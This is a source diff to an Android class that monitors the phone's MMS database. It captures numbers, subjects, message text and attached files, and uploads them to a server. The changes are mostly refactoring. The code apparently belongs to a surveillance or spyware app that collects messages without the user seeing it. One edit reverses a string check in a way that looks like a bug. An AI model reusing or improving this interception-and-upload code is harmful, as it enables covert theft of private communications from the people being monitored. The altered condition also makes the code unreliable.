@@ -15,18 +15,18 @@ import android.os.Handler;
 import android.provider.Telephony;
 import android.util.Log;
 
-import com.inet.android.request.ConstantValue;
+import com.inet.android.request.AppConstants;
 import com.inet.android.request.RequestList;
+import com.inet.android.utils.AppSettings;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
-import com.inet.android.utils.ValueWork;
 import com.loopj.android.http.RequestParams;
 
 public class MMSObserver extends ContentObserver {
 	private static final String LOG_TAG = MMSObserver.class.getSimpleName()
 			.toString();
 	private static final Uri mmsURI = Uri.parse("content://mms/");
-	private static Context mContext;
+	private Context mContext;
 	// private static long currentId = 0;
 	int mmsCount = 0;
 	private String expansion = null;
@@ -39,7 +39,7 @@ public class MMSObserver extends ContentObserver {
 
 	public MMSObserver(Handler handler, Context ctx) {
 		super(handler);
-		MMSObserver.mContext = ctx;
+		mContext = ctx;
 	}
 
 	public boolean deliverSelfNotifications() {
@@ -54,6 +54,8 @@ public class MMSObserver extends ContentObserver {
 		if (mmsCur != null && mmsCur.getCount() > 0) {
 			mmsCount = mmsCur.getCount();
 			Logging.doLog(LOG_TAG, "MMSMonitor :: Init MMSCount == " + mmsCount);
+			mmsCur.close();
+
 		}
 		Cursor mmsCur2 = mContext.getContentResolver().query(
 				Telephony.Mms.CONTENT_URI, projection, "msg_box = 1", null,
@@ -62,6 +64,8 @@ public class MMSObserver extends ContentObserver {
 			int mmsCount2 = mmsCur2.getCount();
 			Logging.doLog(LOG_TAG,
 					"MMSMonitor :: Init MMSCount 'msg_box = 1' == " + mmsCount2);
+			mmsCur2.close();
+
 		}
 		Cursor mmsCur22 = mContext.getContentResolver().query(
 				Telephony.Mms.CONTENT_URI, projection, "msg_box = 2", null,
@@ -80,12 +84,11 @@ public class MMSObserver extends ContentObserver {
 			// mmsCount += mmsCount3;
 			Logging.doLog(LOG_TAG,
 					"MMSMonitor :: Init MMSCount 'msg_box = 3' == " + mmsCount3);
+			mmsCur3.close();
 		}
 		Logging.doLog(LOG_TAG, "MMSMonitor :: Init All MMS Count == "
 				+ mmsCount);
-		mmsCur.close();
-		mmsCur2.close();
-		mmsCur3.close();
+
 	}
 
 	@Override
@@ -97,7 +100,7 @@ public class MMSObserver extends ContentObserver {
 	public void onChange(boolean selfChange, Uri uri) {
 		Logging.doLog(LOG_TAG, "onChange");
 		// Logging.doLog(TAG, "uri: " + uri.toString());
-		if (ValueWork.getState(ConstantValue.TYPE_INCOMING_SMS_REQUEST,
+		if (AppSettings.getState(AppConstants.TYPE_INCOMING_SMS_REQUEST,
 				mContext) == 0)
 			return;
 		byte[] dataFile = null; // изображение mms
@@ -135,18 +138,9 @@ public class MMSObserver extends ContentObserver {
 				.query(mmsURI, new String[] { "*" },
 						"msg_box = 1 or msg_box = 2", null, "_id");
 		int currentMMSCount = 0;
-
-		Logging.doLog(LOG_TAG, "1 mmsCursor.getCount: " + mmsCursor.getCount());
-		Logging.doLog(LOG_TAG, "1 currMMScount: " + currentMMSCount);
-		Logging.doLog(LOG_TAG, "1 mmsCount: " + mmsCount);
-
 		if (mmsCursor != null && mmsCursor.getCount() > 0) {
 			currentMMSCount = mmsCursor.getCount();
 		}
-
-		Logging.doLog(LOG_TAG, "2 mmsCursor.getCount: " + mmsCursor.getCount());
-		Logging.doLog(LOG_TAG, "2 currMMScount: " + currentMMSCount);
-		Logging.doLog(LOG_TAG, "2 mmsCount: " + mmsCount);
 
 		if (currentMMSCount > mmsCount) {
 			mmsCount = currentMMSCount;
@@ -169,17 +163,17 @@ public class MMSObserver extends ContentObserver {
 						.getColumnIndex("sub"));
 				Logging.doLog(LOG_TAG, "subject: " + mmsSubject);
 
-				mmsTime = ConvertDate.getDate(System.currentTimeMillis());
+				mmsTime = ConvertDate.logTime();
 				Log.w(LOG_TAG, "time: " + mmsTime);
 
 				int type = Integer.parseInt(mmsCursor.getString(mmsCursor
 						.getColumnIndex("m_type")));
 				if (type == 128) {
-					mmsDirection = ConstantValue.TYPE_OUTGOING_MMS_REQUEST;
+					mmsDirection = AppConstants.TYPE_OUTGOING_MMS_REQUEST;
 					Logging.doLog(LOG_TAG, "outgoing mms " + type);
 					Log.w(LOG_TAG, "direction: " + mmsDirection);
 				} else {
-					mmsDirection = ConstantValue.TYPE_INCOMING_MMS_REQUEST;
+					mmsDirection = AppConstants.TYPE_INCOMING_MMS_REQUEST;
 					Logging.doLog(LOG_TAG, "incoming mms " + type);
 					Log.w(LOG_TAG, "direction: " + mmsDirection);
 				}
@@ -236,7 +230,7 @@ public class MMSObserver extends ContentObserver {
 						Logging.doLog(LOG_TAG, "Txt Message == " + mmsText);
 					}
 					// Get File
-					else if (isExpansion(contentType) != "") {
+					else if (isExpansion(contentType).equals("")) {
 						Logging.doLog(LOG_TAG, " ==== Get the file start ====");
 						dataFile = readMMSPart(partId);
 						if (payload) {
@@ -264,8 +258,9 @@ public class MMSObserver extends ContentObserver {
 			params.put("data[][time]", ConvertDate.logTime());
 			params.put("data[][type]", mmsDirection);
 			if (payloadSize >= 0)
-				params.put("data[][info][payloads][]", new ByteArrayInputStream(
-						dataFile), mmsNumber + expansion);
+				params.put("data[][info][payloads][]",
+						new ByteArrayInputStream(dataFile), mmsNumber
+								+ expansion);
 			params.put("data[][info][subject]", mmsSubject);
 			params.put("data[][info][number]", mmsNumber);
 			params.put("data[][info][data]", mmsText);
@@ -275,7 +270,7 @@ public class MMSObserver extends ContentObserver {
 			RequestList.sendFileRequest(params, mContext);
 			payload = false;
 		}
-		
+
 		mmsCount = mmsCursor.getCount();
 		payloadSize = -1;
 		mmsCursor.close();
@@ -353,7 +348,7 @@ public class MMSObserver extends ContentObserver {
 	}
 
 	public void setContext(Context context) {
-		this.mContext = context;
+		mContext = context;
 	}
 
 	private String isExpansion(String mime) {
